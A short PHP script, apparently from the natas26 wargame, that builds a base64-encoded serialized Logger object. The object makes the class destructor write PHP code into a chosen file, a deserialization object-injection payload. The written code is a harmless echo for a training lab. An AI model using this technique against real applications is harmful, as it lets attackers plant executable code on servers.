<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
      
    function __construct($file){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";
      
        // write initial message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$initMsg);
        fclose($fd);
    }                       
      
    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }                       
      
    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }                       
}

$payload = unserialize(base64_decode("Tzo2OiJMb2dnZXIiOjM6e3M6NzoibG9nRmlsZSI7czoxMzoiLi9sb2dmaWxlLnR4dCI7czo3OiJpbml0TXNnIjtzOjIyOiIjLS1zZXNzaW9uIHN0YXJ0ZWQtLSMKIjtzOjc6ImV4aXRNc2ciO3M6MzY6Ijw/cGhwIGVjaG8gIllPVSBIQVZFIEJFRU4gSEFDS0VEIiA/PiI7fQ=="));
print_r($payload);
